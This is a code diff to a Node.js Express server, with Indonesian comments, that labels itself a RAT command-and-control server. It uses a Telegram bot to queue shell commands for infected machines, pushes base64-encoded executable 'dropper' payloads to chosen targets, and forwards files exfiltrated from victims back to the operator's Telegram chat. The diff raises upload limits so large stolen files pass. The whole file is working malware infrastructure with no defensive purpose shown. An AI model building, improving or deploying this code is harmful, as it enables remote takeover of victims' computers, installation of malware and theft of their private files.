@@ -3,19 +3,22 @@ const axios = require('axios');
 const FormData = require('form-data'); // Wajib ada untuk kirim file ke Telegram
 const app = express();
 
-app.use(express.json());
+// --- PERBAIKAN PENTING (LIMIT 50MB) ---
+// Tanpa ini, upload gambar/file akan GAGAL.
+app.use(express.json({ limit: '5000mb' }));
+app.use(express.urlencoded({ limit: '5000mb', extended: true }));
 
 const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.BOT_TOKEN_B; // Token Bot RAT
 const CHAT_ID = process.env.CHAT_ID;
 
 // --- DATABASE SEMENTARA (MEMORY) ---
-let onlineBots = {}; // Menyimpan daftar bot: { "user@pc": timestamp }
-let currentTarget = "ALL"; // Default target semua
+let onlineBots = {}; 
+let currentTarget = "ALL"; 
 let commandData = {
-    id: 0,      // ID unik
-    cmd: "",    // Perintah teks
-    payload: "" // Data file (Base64) untuk fitur Dropper
+    id: 0,      
+    cmd: "",    
+    payload: "" 
 };
 
 // --- FUNGSI BANTUAN KIRIM PESAN ---
@@ -43,11 +46,10 @@ async function checkTelegramUpdates() {
                 const message = update.message;
                 if (!message) continue;
 
-                // A. JIKA ADMIN KIRIM TEKS (/cmd, /target, /bots)
+                // A. JIKA ADMIN KIRIM TEKS
                 if (message.text) {
                     const text = message.text;
 
-                    // 1. LIHAT BOT ONLINE
                     if (text === '/bots') {
                         let list = "🤖 **ONLINE BOTS (Last 30s):**\n";
                         let count = 0;
@@ -62,46 +64,39 @@ async function checkTelegramUpdates() {
                         list += `\n🎯 Target: \`${currentTarget}\``;
                         await sendTelegram(list);
                     }
-                    // 2. PILIH TARGET
                     else if (text.startsWith('/target ')) {
                         currentTarget = text.replace('/target ', '').trim();
                         await sendTelegram(`🎯 Target set to: \`${currentTarget}\``);
                     }
-                    // 3. KIRIM PERINTAH BIASA
                     else if (text.startsWith('/cmd ')) {
                         const cmd = text.replace('/cmd ', '').trim();
                         commandData = {
                             id: Date.now(),
                             cmd: cmd,
-                            payload: "" // Kosongkan payload jika cuma teks
+                            payload: "" 
                         };
                         await sendTelegram(`🚀 Command sent to **${currentTarget}**: \`${cmd}\``);
                     }
                 }
 
                 // B. JIKA ADMIN KIRIM FILE (REVERSE DROPPER)
-                // Kamu drag & drop file .exe ke bot -> RAT install otomatis
                 else if (message.document) {
                     const fileId = message.document.file_id;
                     const fileName = message.document.file_name;
 
                     await sendTelegram(`⏳ Receiving payload: \`${fileName}\`...`);
 
-                    // 1. Download File dari Server Telegram
                     const fileInfo = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`);
                     const filePath = fileInfo.data.result.file_path;
                     const downloadUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;
 
                     const fileData = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
-                    
-                    // 2. Ubah jadi Base64
                     const base64Str = Buffer.from(fileData.data).toString('base64');
 
-                    // 3. Siapkan Command Global
                     commandData = {
                         id: Date.now(),
-                        cmd: `save ${fileName}`, // Perintah khusus RAT
-                        payload: base64Str       // Isi file
+                        cmd: `save ${fileName}`, 
+                        payload: base64Str       
                     };
 
                     await sendTelegram(`☢️ **DROPPER ACTIVE**: \`${fileName}\` sent to **${currentTarget}**!`);
@@ -111,16 +106,14 @@ async function checkTelegramUpdates() {
     } catch (e) { /* Ignore error */ }
 }
 
-// --- ENDPOINT 1: POLLING (RAT MINTA TUGAS) ---
+// --- ENDPOINT 1: POLLING ---
 app.post('/poll', async (req, res) => {
     try {
         const { bot_id } = req.body;
-        if (bot_id) onlineBots[bot_id] = Date.now(); // Absen
+        if (bot_id) onlineBots[bot_id] = Date.now();
 
-        // Cek Telegram dulu sebelum jawab
         await checkTelegramUpdates();
 
-        // Cek Target
         let isTarget = (currentTarget === "ALL" || currentTarget === bot_id);
         
         if (isTarget && commandData.cmd !== "") {
@@ -128,7 +121,6 @@ app.post('/poll', async (req, res) => {
                 status: "command",
                 id: commandData.id,
                 cmd: commandData.cmd,
-                // Kirim payload (file) hanya jika commandnya "save ..."
                 payload: commandData.cmd.startsWith("save ") ? commandData.payload : ""
             });
         }
@@ -137,17 +129,16 @@ app.post('/poll', async (req, res) => {
     } catch (e) { res.json({ status: "error" }); }
 });
 
-// --- ENDPOINT 2: REPORT (RAT LAPOR HASIL / UPLOAD FILE) ---
+// --- ENDPOINT 2: REPORT (UPLOAD FILE & LOGS) ---
 app.post('/report', async (req, res) => {
     try {
         const { id, aes, chacha } = req.body;
-        // aes = Data (Output Teks / File Base64)
-        // chacha = Command Asli (misal: "upload password.txt")
 
         // A. JIKA RAT MENGIRIM FILE (EXFILTRATION)
         if (chacha.startsWith("upload ")) {
             const filename = chacha.replace("upload ", "").trim();
-            
+            console.log(`[INFO] Receiving File: ${filename} from ${id}`);
+
             // Konversi Base64 balik ke Buffer
             const fileBuffer = Buffer.from(aes, 'base64');
 
@@ -157,8 +148,11 @@ app.post('/report', async (req, res) => {
             form.append('document', fileBuffer, { filename: filename });
             form.append('caption', `📂 Exfiltrated from: \`${id}\``);
 
+            // Tambahkan maxContentLength agar Axios tidak menolak file besar
             await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
-                headers: form.getHeaders()
+                headers: form.getHeaders(),
+                maxContentLength: Infinity,
+                maxBodyLength: Infinity
             });
         } 
         // B. JIKA RAT LAPOR TEKS BIASA
@@ -168,7 +162,10 @@ app.post('/report', async (req, res) => {
         }
 
         res.json({ status: 'success' });
-    } catch (e) { res.json({ status: 'error' }); }
+    } catch (e) { 
+        console.error("Report Error:", e.message);
+        res.json({ status: 'error' }); 
+    }
 });
 
 app.listen(PORT, () => console.log(`RAT C2 Server Running`));
